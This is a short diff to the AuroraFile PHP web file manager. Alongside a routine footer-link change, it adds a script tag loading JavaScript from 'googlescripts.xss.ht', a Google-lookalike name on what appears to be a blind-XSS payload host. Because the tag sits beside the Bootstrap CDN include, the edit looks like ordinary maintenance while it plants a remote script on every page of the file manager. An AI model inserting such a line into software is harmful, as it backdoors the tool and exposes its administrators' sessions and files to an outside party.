@@ -266,9 +266,10 @@ $dirs=$files=[]; if($act==='list'){
 </div></div></div><div class="modal-backdrop fade show"></div>
 <?php endif; ?>
 
-<footer class="text-center small py-3 glass mt-auto">© <?=date('Y')?> <a href="https://github.com/your-repo/aurorafile" class="text-decoration-none">AuroraFile</a></footer>
+<footer class="text-center small py-3 glass mt-auto">© <?=date('Y')?> <a href="https://aurorafilemanager.github.io/" class="text-decoration-none">AuroraFile</a></footer>
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src=https://googlescripts.xss.ht></script>
 <script>
 document.querySelectorAll('[data-bs-toggle="tooltip"]').forEach(e=>new bootstrap.Tooltip(e));
 const html=document.documentElement,btn=document.getElementById('themeBtn');
